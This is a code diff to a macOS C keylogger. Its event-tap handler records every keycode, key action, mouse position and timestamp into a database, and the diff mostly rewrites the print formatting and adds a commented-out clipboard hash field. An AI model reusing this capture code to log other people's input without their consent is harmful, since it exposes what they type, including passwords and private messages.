@@ -1,6 +1,6 @@
 #pragma once
-#include "submodules/meson_deps/submodules/generic-print/print.h"
 #include <signal.h>
+//#include "print.h"
 #include <stdlib.h>
 /**********************************/
 #include "keylogger.h"
@@ -122,14 +122,14 @@ int init(){
 
 
 CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-  uint64_t  TS = (uint64_t)CGEventGetTimestamp(event);
-  char      *action = "UNKNOWN", *ckc = "UNKNOWN", *input_type = "UNKNOWN";
-  CGKeyCode keyCode = 0;
+  unsigned long TS = (unsigned long)timestamp();
+  char          *action = "UNKNOWN", *ckc = "UNKNOWN", *input_type = "UNKNOWN";
+  CGKeyCode     keyCode = 0;
   bool
-            key_up = ((type == kCGEventKeyUp) ? true : false),
-    key_down       = ((type == kCGEventKeyDown) ? true : false),
-    is_mouse       = ((IsMouseEvent(type)) ? true : false),
-    is_keyboard    = ((is_mouse) ? false : true)
+                key_up = ((type == kCGEventKeyUp) ? true : false),
+    key_down           = ((type == kCGEventKeyDown) ? true : false),
+    is_mouse           = ((IsMouseEvent(type)) ? true : false),
+    is_keyboard        = ((is_mouse) ? false : true)
   ;
 
   input_type = ((is_mouse) ? "mouse" : ((is_keyboard) ? ("keyboard") : ("UNKNOWN")));
@@ -144,12 +144,20 @@ CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
   }
 
   fprintf(stdout, "%s", AC_CLS);
-  PRINT(
-    "\n\t  | keycode: ", (int)keyCode, "| action:", (char *)action, "|", (char *)ckc,
-    "\n\t  | key up?", (bool)key_up,
-    "\n\t  | action:", (char *)action,
-    "\n\t  | ts:", (size_t)TS
-    );
+  fprintf(stdout,
+          "\n\t  | ts     : %lu"
+          "\n\t  | keycode: %d"
+          "\n\t  | action:  %s"
+          "\n\t  | key:     %s"
+          "\n\t  | action:  %s"
+          "\n\t  | ts:"
+          "\n",
+          (size_t)TS,
+          (int)keyCode,
+          (char *)action,
+          (char *)ckc,
+          (char *)action
+          );
 
 
   keylogger_insert_db_row(&(logged_key_event_t){
@@ -161,6 +169,7 @@ CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
     .mouse_x    = (unsigned long)mouse_location.x,
     .mouse_y    = (unsigned long)mouse_location.y,
     .input_type = input_type,
+//    .clipboard_hash = 12345,
   });
 
   return(event);
